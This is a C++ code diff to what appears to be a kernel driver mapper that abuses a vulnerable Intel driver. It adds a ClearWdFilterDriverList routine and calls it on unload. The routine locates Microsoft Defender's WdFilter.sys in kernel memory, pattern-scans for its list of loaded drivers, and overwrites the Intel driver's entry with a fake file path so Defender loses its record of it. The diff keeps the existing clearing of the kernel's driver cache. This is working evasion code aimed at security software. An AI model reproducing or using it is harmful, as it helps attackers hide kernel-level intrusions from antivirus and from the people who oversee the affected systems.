@@ -109,6 +109,7 @@ bool intel_driver::Unload(HANDLE device_handle) {
 	Log(L"[<] Unloading vulnerable driver" << std::endl);
 
 	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
+		intel_driver::ClearWdFilterDriverList(device_handle);
 		CloseHandle(device_handle);
 	}
 
@@ -604,8 +605,8 @@ PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_A
 }
 
 
-intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {
-	
+intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {
+
 	PiDDBCacheEntry localentry{};
 	localentry.TimeDateStamp = timestamp;
 	localentry.DriverName.Buffer = (PWSTR)name;
@@ -613,6 +614,103 @@ intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, P
 	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;
 
 	return (PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(device_handle, PiDDBCacheTable, (PVOID)&localentry);
+}
+
+bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {
+	auto WdFilter = utils::GetKernelModuleAddress("WdFilter.sys");
+	if (!WdFilter) {
+		Log(L"[!] Failed to find WdFilter.sys" << std::endl);
+		//driver::Unload(device_handle);
+		return false;
+	}
+
+	auto g_table = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", (char*)"xxx????xx");
+	if (!g_table) {
+		Log(L"[!] Failed to find g_table" << std::endl);
+		//driver::Unload(device_handle);
+		return false;
+	}
+
+	g_table = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)g_table, 3, 7);
+	uintptr_t g_table_Head = g_table - 0x8;
+
+	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY*
+	{
+		LIST_ENTRY* Entry;
+		if (!ReadMemory(device_handle, Address, &Entry, sizeof(LIST_ENTRY))) return 0;
+		return Entry;
+	};
+
+	LIST_ENTRY* firstEntry = ReadListEntry(g_table_Head);
+
+	Log(L"[*]  Original wd filters" << std::endl);
+	for (LIST_ENTRY* Entry = ReadListEntry(g_table_Head); Entry
+		!= NULL;
+		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
+	{
+		UNICODE_STRING Unicode_String;
+		if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING)))
+		{
+			wchar_t* ImageName = new wchar_t[(ULONG64)Unicode_String.Length / 2ULL + 1ULL];
+			memset(ImageName, 0, Unicode_String.Length + sizeof(wchar_t));
+
+			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName, Unicode_String.Length)) {
+
+				std::wstring intelDriverName = intel_driver::GetDriverNameW();
+				std::wstring newName = L"\\Windows\\System32\\drivers\\iqvsw64e2.sys";
+				Log(ImageName << std::endl);
+				if (wcsstr(ImageName, intelDriverName.c_str()))
+				{
+					//auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
+					//auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));
+					//WriteMemory(device_handle, uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), NextEntry, sizeof(LIST_ENTRY));
+					//WriteMemory(device_handle, uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), PrevEntry, sizeof(LIST_ENTRY));
+					//ZeroMemory(Unicode_String.Buffer, Unicode_String.Length);
+					WriteMemory(device_handle, (uintptr_t)Unicode_String.Buffer, &newName, Unicode_String.Length);
+
+					delete[] ImageName;
+					break;
+				}
+			}
+
+			delete[] ImageName;
+		}
+
+
+	}
+
+	Log(L"[*]  Patched wd filters" << std::endl);
+	bool initial = true;
+	for (LIST_ENTRY* Entry = ReadListEntry(g_table_Head); Entry
+		!= NULL;
+		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
+	{
+		if (firstEntry == Entry && initial == false) {
+			break;
+		}
+		initial = false;
+		UNICODE_STRING Unicode_String;
+		if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING)))
+		{
+			wchar_t* ImageName = new wchar_t[(ULONG64)Unicode_String.Length / 2ULL + 1ULL];
+			memset(ImageName, 0, Unicode_String.Length + sizeof(wchar_t));
+
+			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName, Unicode_String.Length)) {
+
+				Log(ImageName << std::endl);
+				if (wcsstr(ImageName, L"iqvsw64e"))
+				{
+					Log("Bingo?" << std::endl);
+				}
+			}
+
+			delete[] ImageName;
+		}
+	}
+
+	int x = 0;
+	std::cin >> x;
+	return true;
 }
 
 bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver
